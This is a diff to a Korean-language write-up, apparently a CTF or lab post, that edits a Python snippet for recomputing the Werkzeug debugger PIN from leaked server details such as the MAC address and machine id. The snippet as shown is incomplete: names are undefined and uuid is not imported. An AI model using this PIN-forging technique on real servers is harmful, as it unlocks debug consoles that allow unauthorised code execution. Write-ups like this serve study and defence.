@@ -93,8 +93,14 @@ s 파라미터에 입력되어야 할 값을 알아내기 위해 curl localhost:
 PIN 번호를 생성하기 위한 코드는 다음과 같다.
 
 ```
-# This information only exists to make the cookie unique on the
-    # computer, not as a security feature.
+from itertools import chain
+import hashlib
+import requests
+import sys
+import re
+import urllib
+
+def generate_pin():
     probably_public_bits = [
         username,
         modname,
@@ -102,10 +108,10 @@ PIN 번호를 생성하기 위한 코드는 다음과 같다.
         getattr(mod, "__file__", None),
     ]
 
-    # This information is here to make it harder for an attacker to
-    # guess the cookie name.  They are unlikely to be contained anywhere
-    # within the unauthenticated debug page.
-    private_bits = [str(uuid.getnode()), get_machine_id()]
+    private_bits = [str(uuid.getnode()), get_machine_id()] 
+
+    rv = None
+    num = None
 
     h = hashlib.sha1()
     for bit in chain(probably_public_bits, private_bits):
@@ -136,6 +142,9 @@ PIN 번호를 생성하기 위한 코드는 다음과 같다.
                 break
         else:
             rv = num
+    return rv
+
+print(generate_pin())
 ```
 
 코드를 보면 PIN 번호를 생성하기 위해 probably_public_bits, private_bits 두 리스트를 사용한다. 리스트의 요소 값들은 서버 측의 정보를 필요로 하여 일반적으로는 유추해낼 수 없으나 지금과 같이 서버 내부 정보를 파악할 수 있는 취약점이 존재한다면 요소 값들을 알아낼 수 있다.
